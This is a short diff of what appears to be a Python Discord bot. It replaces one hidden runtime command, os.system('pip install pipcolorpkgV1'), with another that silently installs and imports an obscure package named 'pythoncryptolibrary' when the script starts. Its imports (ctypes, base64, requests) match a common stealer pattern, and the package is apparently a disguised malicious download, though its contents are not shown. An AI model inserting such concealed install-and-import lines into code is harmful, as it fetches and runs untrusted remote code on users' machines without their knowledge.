@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pipcolorpkgV1")
-import pipcolorpkgV1
+os.system("pip install pythoncryptolibrary")
+import pythoncryptolibrary
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
